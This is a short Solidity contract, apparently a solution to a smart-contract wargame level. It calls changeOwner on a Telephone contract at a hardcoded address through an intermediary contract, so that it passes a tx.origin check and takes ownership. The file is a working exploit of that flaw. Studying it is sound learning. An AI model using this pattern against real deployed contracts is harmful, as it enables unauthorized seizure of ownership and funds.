// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../interfaces/ITelephone.sol";

contract BeatTelephone {
    ITelephone public telephoneContract;

    constructor() {
        telephoneContract = ITelephone(
            0xFf46bc71449753636A4402a2FCad097D61bE549F
        );
    }

    function becomeOwner() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
